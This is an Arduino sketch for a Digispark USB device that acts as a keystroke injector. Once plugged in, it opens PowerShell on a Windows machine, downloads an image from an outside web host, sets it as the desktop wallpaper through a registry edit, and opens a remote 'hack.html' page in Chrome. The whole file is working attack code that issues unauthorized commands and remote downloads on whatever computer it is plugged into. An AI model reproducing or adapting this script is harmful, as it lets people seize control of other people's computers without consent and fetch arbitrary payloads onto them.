#include "DigiKeyboard.h"
int delay_num = 1200;
void setup()                            {
  //empty
}
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(delay_num);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(delay_num);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delay_num);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delay_num);
  DigiKeyboard.print("$client.DownloadFile(\"https://osamaelkassaby.online/404/hack.jpg\" , \"hack.jpg\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delay_num);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\hack.jpg\" /f");
  DigiKeyboard.delay(delay_num);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delay_num);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delay_num);
  DigiKeyboard.print("start chrome http://osamaelkassaby.online/hack.html");
    DigiKeyboard.delay(delay_num);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(delay_num);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
